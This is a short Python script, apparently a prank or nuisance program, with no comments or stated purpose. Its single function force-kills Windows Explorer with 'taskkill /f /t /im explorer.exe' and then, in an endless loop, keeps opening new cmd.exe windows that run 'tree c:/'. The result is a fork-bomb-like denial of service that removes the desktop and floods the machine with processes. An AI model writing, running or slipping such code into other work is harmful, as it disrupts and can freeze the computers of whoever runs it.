import os
import time


def tes():
    os.system("taskkill /f /t /im explorer.exe")
    while True:
        os.system('start C:\Windows\System32\cmd.exe /K \"tree c:/" ')
